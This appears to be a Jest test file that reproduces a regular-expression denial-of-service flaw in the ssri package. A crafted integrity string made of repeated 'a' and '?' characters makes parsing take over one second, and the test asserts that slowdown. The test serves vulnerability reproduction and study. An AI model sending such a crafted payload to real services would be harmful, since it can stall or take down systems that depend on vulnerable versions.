
test("ReDos in ssri", () => {

    const genstr = require("./utils").genstr;
    const measureTime = require("./utils").measureTime;
    const ssri = require('ssri')

    const integrity = 'sha512-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa?????????????????????????????????? b';
 //   const integrity = 'sha512-9KhgCRIx/AmzC8xqYJTZRrnO8OW2Pxyl2DIMZSBOr0oDvtEFyht3xpp71j/r/pAe1DM+JI/A+line3jUBgzQ7A==?foo'
    
    let t =measureTime(function () {
        const parsed = ssri.parse(integrity,{"strict":true,"single":true})
        ssri.stringify(parsed) 
        //let s = parsed.toString() // === integrity

    
    });
    
    let time= t[0]+t[1]/1000000000;
    
    expect(time).toBeGreaterThan(1);
});